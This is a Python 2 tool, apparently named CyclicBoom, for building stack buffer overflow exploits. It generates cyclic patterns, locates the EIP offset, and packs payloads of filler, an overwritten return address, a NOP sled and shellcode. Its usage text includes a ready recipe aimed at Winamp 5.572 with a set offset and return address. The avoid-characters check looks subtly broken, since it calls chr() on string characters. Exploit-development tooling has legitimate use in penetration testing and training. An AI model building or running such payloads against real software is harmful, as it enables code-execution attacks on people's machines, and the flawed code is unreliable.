import argparse
import ast
import os
import sys

# Parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(
        description="CyclicBoom: A tool for buffer overflow testing and payload creation.",
        epilog=(
            "Examples:\n"
            "  Generate: python cyclicboom.py --mode generate --output pattern.bin --length 1011 --prefix 'PRE' --suffix-byte 0xF9350101 --avoid-chars '\\x00\\x0a'\n"
            "  Pack: python cyclicboom.py --mode pack --output payload.bin --prefix 'Winamp 5.572 ' --eip-position 552 --eip-value 0xEA631577 --nop-sled-length 100 --shellcode-payload calc.shellcode.hex --payload-format hex\n"
            "  Search: python cyclicboom.py --mode search --input pattern.bin --eip-value 41424344"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "--mode",
        choices=["generate", "search", "pack"],
        default="generate",
        help="Operation mode: 'generate' creates a cyclic pattern, 'search' finds EIP offset, 'pack' builds a payload with EIP control and shellcode (default: generate)"
    )
    parser.add_argument(
        "--output",
        help="File path to write the output (required for generate and pack modes)"
    )
    group_length = parser.add_mutually_exclusive_group(required=False)
    group_length.add_argument(
        "--length",
        type=int,
        help="Exact length of cyclic pattern (excludes prefix/suffix, mutually exclusive with --max-length, used in generate)"
    )
    group_length.add_argument(
        "--max-length",
        type=int,
        help="Maximum total length of output (prefix + cyclic + suffix, mutually exclusive with --length, used in generate)"
    )
    group_prefix = parser.add_mutually_exclusive_group()
    group_prefix.add_argument(
        "--prefix",
        default="",
        help="String to prepend to cyclic pattern (mutually exclusive with --prefix-byte, default: empty)"
    )
    group_prefix.add_argument(
        "--prefix-byte",
        default="",
        help="Hex byte string to prepend to cyclic pattern (e.g., '0x00112233', mutually exclusive with --prefix, default: empty)"
    )
    group_suffix = parser.add_mutually_exclusive_group()
    group_suffix.add_argument(
        "--suffix",
        default="",
        help="String to append to cyclic pattern (mutually exclusive with --suffix-byte, default: empty, used in generate)"
    )
    group_suffix.add_argument(
        "--suffix-byte",
        default="",
        help="Hex byte string to append to cyclic pattern (e.g., '0xF9350101', mutually exclusive with --suffix, default: empty, used in generate)"
    )
    parser.add_argument(
        "--avoid-chars",
        default="",
        help="Byte string of chars to avoid in cyclic pattern (e.g., '\\x00\\x0a', default: none)"
    )
    parser.add_argument(
        "--input",
        help="Input file containing cyclic pattern (required for search mode)"
    )
    parser.add_argument(
        "--eip-value",
        help="4-byte hex string overwriting EIP (e.g., '0x41424344', required for search and pack modes)"
    )
    parser.add_argument(
        "--eip-position",
        type=int,
        help="Byte offset where EIP value starts in pack mode (required for pack)"
    )
    parser.add_argument(
        "--shellcode-payload",
        help="File path to shellcode payload (optional for pack mode)"
    )
    parser.add_argument(
        "--payload-format",
        choices=["hex", "raw"],
        default="raw",
        help="Format of shellcode payload file: 'hex' for hex string, 'raw' for binary (default: raw, required if shellcode-payload is specified)"
    )
    parser.add_argument(
        "--nop-sled-length",
        type=int,
        default=0,
        help="Number of NOP bytes (\\x90) to insert before shellcode in pack mode (default: 0)"
    )
    args = parser.parse_args()
    if args.mode == "generate" and not args.output:
        parser.error("--output is required in generate mode")
    if args.mode == "generate" and args.length is None and args.max_length is None:
        parser.error("One of --length or --max-length is required in generate mode")
    if args.mode == "pack" and (not args.output or not args.eip_value or args.eip_position is None):
        parser.error("--output, --eip-value, and --eip-position are required in pack mode")
    if args.mode == "pack" and args.shellcode_payload and not args.payload_format:
        parser.error("--payload-format is required when --shellcode-payload is specified")
    if args.mode == "pack" and args.nop_sled_length < 0:
        parser.error("--nop-sled-length must be non-negative")
    if args.mode == "pack" and args.eip_position < 0:
        parser.error("--eip-position must be non-negative")
    return args

# Convert hex string to bytes (handles 0x or raw hex, variable length)
def hex_to_bytes(hex_str):
    hex_str = hex_str.replace("0x", "").replace("0X", "")
    if len(hex_str) % 2 != 0:
        raise ValueError("Hex string must have even length")
    try:
        return "".join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))
    except ValueError:
        raise ValueError("Invalid hex string")

# Generate cyclic pattern (unique 4-byte combos)
def generate_cyclic_pattern(length, avoid_chars):
    if length <= 0:
        return ""
    # Use printable ASCII: uppercase (A-Z), lowercase (a-z), digits (0-9)
    chars = [chr(i) for i in range(65, 91)] + [chr(i) for i in range(97, 123)] + [chr(i) for i in range(48, 58)]
    pattern = []
    i = 0
    while len(pattern) < length:
        # Generate 4-byte combo: Aa0A style
        c1 = chars[i / (len(chars) ** 3) % len(chars)]
        c2 = chars[(i / (len(chars) ** 2)) % len(chars)]
        c3 = chars[(i / len(chars)) % len(chars)]
        c4 = chars[i % len(chars)]
        combo = c1 + c2 + c3 + c4
        # Skip if contains any avoid_chars (if provided)
        if not avoid_chars or not any(chr(c) in combo for c in avoid_chars):
            pattern.append(combo)
        i += 1
        if i >= len(chars) ** 4:
            print "Warning: Ran out of unique patterns. Using max possible length."
            break
    # Truncate to exact length
    pattern = "".join(pattern)[:length]
    return pattern

# Read shellcode from file
def read_shellcode(payload_file, payload_format):
    if not os.path.exists(payload_file):
        raise ValueError("Shellcode payload file does not exist")
    with open(payload_file, "rb" if payload_format == "raw" else "r") as f:
        data = f.read()
    if payload_format == "hex":
        try:
            return hex_to_bytes(data.strip())
        except ValueError as e:
            raise ValueError("Invalid hex string in shellcode file: {}".format(e))
    return data

# Search for EIP offset in pattern
def search_pattern(pattern_file, eip_value):
    with open(pattern_file, "rb") as f:
        pattern = f.read()
    eip_bytes = hex_to_bytes(eip_value)
    if len(eip_bytes) != 4:
        raise ValueError("EIP value must be a 4-byte hex string")
    # Try little-endian (reversed) first
    little_endian = eip_bytes[::-1]
    offset = pattern.find(little_endian)
    endian = "little-endian"
    if offset == -1:
        # Try big-endian
        offset = pattern.find(eip_bytes)
        endian = "big-endian"
    if offset == -1:
        print "EIP value not found in pattern (tried both little and big-endian)"
        return None, None, None
    return offset, offset - 1 if offset > 0 else None, endian

# Main function
def main():
    args = parse_args()
    
    if args.mode == "generate":
        # Parse avoid_chars safely
        try:
            avoid_chars = ast.literal_eval(args.avoid_chars) if args.avoid_chars else ""
            if not isinstance(avoid_chars, str):
                raise ValueError
        except (ValueError, SyntaxError):
            print "Error: --avoid-chars must be a valid byte string (e.g., '\\x00\\x0a')"
            sys.exit(1)
        # Parse prefix/suffix bytes
        try:
            prefix = hex_to_bytes(args.prefix_byte) if args.prefix_byte else args.prefix
        except ValueError as e:
            print "Error: Invalid --prefix-byte: {}".format(e)
            sys.exit(1)
        try:
            suffix = hex_to_bytes(args.suffix_byte) if args.suffix_byte else args.suffix
        except ValueError as e:
            print "Error: Invalid --suffix-byte: {}".format(e)
            sys.exit(1)
        # Calculate lengths
        prefix_len = len(prefix)
        suffix_len = len(suffix)
        if args.length is not None:
            cyclic_len = args.length
        else:  # max-length mode
            cyclic_len = args.max_length - prefix_len - suffix_len
        if cyclic_len < 0:
            print "Error: Prefix + suffix length exceeds max-length"
            sys.exit(1)
        if cyclic_len == 0:
            print "Warning: Cyclic pattern length is 0 due to prefix/suffix"
        # Generate pattern
        cyclic_pattern = generate_cyclic_pattern(cyclic_len, avoid_chars)
        # Adjust suffix if needed in max-length mode
        if args.max_length is not None and len(cyclic_pattern) < cyclic_len:
            suffix_len = min(suffix_len, args.max_length - prefix_len - len(cyclic_pattern))
            suffix = suffix[:suffix_len]
        output_data = prefix + cyclic_pattern + suffix
        # Write to file
        with open(args.output, "wb") as f:
            f.write(output_data)
        # Print report
        print "Pattern generated successfully:"
        print "Prefix: {} bytes".format(prefix_len)
        print "Cyclic pattern: {} bytes".format(len(cyclic_pattern))
        print "Suffix: {} bytes".format(suffix_len)
        print "Total: {} bytes".format(len(output_data))
        print "Use '!mona suggest' in Immunity Debugger to refine the exact length to EIP."
    
    elif args.mode == "pack":
        # Parse avoid_chars safely
        try:
            avoid_chars = ast.literal_eval(args.avoid_chars) if args.avoid_chars else ""
            if not isinstance(avoid_chars, str):
                raise ValueError
        except (ValueError, SyntaxError):
            print "Error: --avoid-chars must be a valid byte string (e.g., '\\x00\\x0a')"
            sys.exit(1)
        # Parse prefix
        try:
            prefix = hex_to_bytes(args.prefix_byte) if args.prefix_byte else args.prefix
        except ValueError as e:
            print "Error: Invalid --prefix-byte: {}".format(e)
            sys.exit(1)
        # Parse eip-value
        try:
            eip_bytes = hex_to_bytes(args.eip_value)
            if len(eip_bytes) != 4:
                raise ValueError("EIP value must be a 4-byte hex string")
        except ValueError as e:
            print "Error: Invalid --eip-value: {}".format(e)
            sys.exit(1)
        # Read shellcode if provided
        shellcode = ""
        shellcode_len = 0
        if args.shellcode_payload:
            try:
                shellcode = read_shellcode(args.shellcode_payload, args.payload_format)
                shellcode_len = len(shellcode)
            except ValueError as e:
                print "Error: {}".format(e)
                sys.exit(1)
        # Calculate lengths
        prefix_len = len(prefix)
        eip_len = len(eip_bytes)
        nop_sled_len = args.nop_sled_length
        cyclic_len = args.eip_position - prefix_len
        if cyclic_len < 0:
            print "Error: eip-position is less than prefix length"
            sys.exit(1)
        if cyclic_len == 0:
            print "Warning: Cyclic pattern length is 0 due to prefix"
        # Generate components
        cyclic_pattern = generate_cyclic_pattern(cyclic_len, avoid_chars)
        nop_sled = "\x90" * nop_sled_len
        # Combine payload
        output_data = prefix + cyclic_pattern + eip_bytes + nop_sled + shellcode
        # Write to file
        with open(args.output, "wb") as f:
            f.write(output_data)
        # Print report
        print "Payload packed successfully:"
        print "Prefix: {} bytes".format(prefix_len)
        print "Cyclic pattern: {} bytes".format(len(cyclic_pattern))
        print "EIP value: {} bytes".format(eip_len)
        print "NOP sled: {} bytes".format(nop_sled_len)
        print "Shellcode: {} bytes".format(shellcode_len)
        print "Total: {} bytes".format(len(output_data))
        print "Use '!mona suggest' in Immunity Debugger to verify EIP alignment."
    
    else:  # search mode
        if not args.input or not args.eip_value:
            print "Error: --input and --eip-value are required in search mode"
            sys.exit(1)
        if not os.path.exists(args.input):
            print "Error: Input file does not exist"
            sys.exit(1)
        try:
            offset, last_byte, endian = search_pattern(args.input, args.eip_value)
            if offset is not None:
                print "EIP value found at offset {} ({} endian)".format(offset, endian)
                if last_byte is not None:
                    print "Last byte before EIP: offset {}".format(last_byte)
                print "EIP byte: offset {}".format(offset)
        except ValueError as e:
            print "Error: {}".format(e)
            sys.exit(1)

if __name__ == "__main__":
    main()